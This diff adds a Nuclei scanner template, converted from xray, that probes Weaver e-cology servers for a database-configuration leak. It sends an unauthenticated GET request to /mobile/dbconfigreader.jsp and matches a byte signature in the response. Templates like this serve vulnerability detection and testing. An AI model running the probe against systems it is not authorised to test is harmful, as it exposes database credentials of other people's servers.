@@ -1,0 +1,25 @@
+id: poc-yaml-weaver-e-cology-dbconfigreader-jsp-info-leak
+
+info:
+  name: poc-yaml-weaver-e-cology-dbconfigreader-jsp-info-leak
+  author: socat
+  severity: high
+  tags: xray-converted,exposure,ct-490564
+  reference:
+    - https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg
+
+http:
+  - raw:
+      - |
+        GET /mobile/dbconfigreader.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\x8a\xd2\xf1\xd4\x98~p\x05Sn"
